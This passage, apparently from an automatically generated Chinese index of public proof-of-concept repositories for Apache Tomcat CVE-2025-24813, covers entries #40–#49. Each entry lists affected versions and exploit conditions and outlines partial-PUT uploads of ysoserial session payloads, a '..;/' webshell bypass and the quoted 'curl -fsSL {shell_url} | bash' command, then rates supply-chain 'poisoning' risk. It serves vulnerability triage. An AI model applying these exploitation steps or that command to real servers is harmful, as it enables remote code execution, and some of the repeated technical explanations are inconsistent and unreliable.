2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
